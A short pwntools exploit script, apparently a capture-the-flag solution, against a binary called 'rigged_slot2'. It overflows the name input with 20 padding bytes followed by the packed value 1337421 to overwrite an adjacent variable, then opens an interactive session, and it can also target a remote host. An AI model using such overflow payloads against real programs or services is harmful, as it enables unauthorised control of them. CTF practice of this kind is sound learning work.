from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
'''.format(**locals())

exe = './rigged_slot2'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

payload = b'A' * 20 + p32(1337421)

# Send the payload
io.sendlineafter(b"Enter your name:", payload)

# Interact with the process to see the result
io.interactive()
